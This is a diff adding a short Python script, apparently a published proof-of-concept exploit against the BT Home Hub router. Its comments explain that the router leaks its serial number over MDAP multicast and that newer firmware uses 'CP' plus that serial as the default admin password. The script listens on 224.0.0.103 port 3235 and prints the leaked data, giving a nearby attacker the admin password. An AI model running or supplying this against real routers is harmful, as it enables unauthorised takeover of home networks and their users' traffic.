@@ -1,0 +1,23 @@
+#!/usr/bin/python
+
+import socket
+import struct
+
+# BT Home Hub leaks its serial number via MDAP ('ANT-ID' parameter)
+# S/N is sent to port 3235 on multicast address 224.0.0.103
+# which this script listens to
+
+# The latest BT Home Hub firmware upgrade (version 6.2.6.E as time of writing
+# introduced a new security feature which changes the default admin password
+# from 'admin' to the serial number of the router: http://snipurl.com/28dfh
+
+# However, the S/N is just the ANT ID paramater with 'CP' prepended to it.
+# i.e.: if ANT ID is YYWWPPXXX then the S/N would be CPYYWWPPXXX
+ 
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+sock.bind(('', 3235))
+mreq = struct.pack("4sl", socket.inet_aton("224.0.0.103"), socket.INADDR_ANY)
+sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
+while True:
+	print sock.recv(10240)
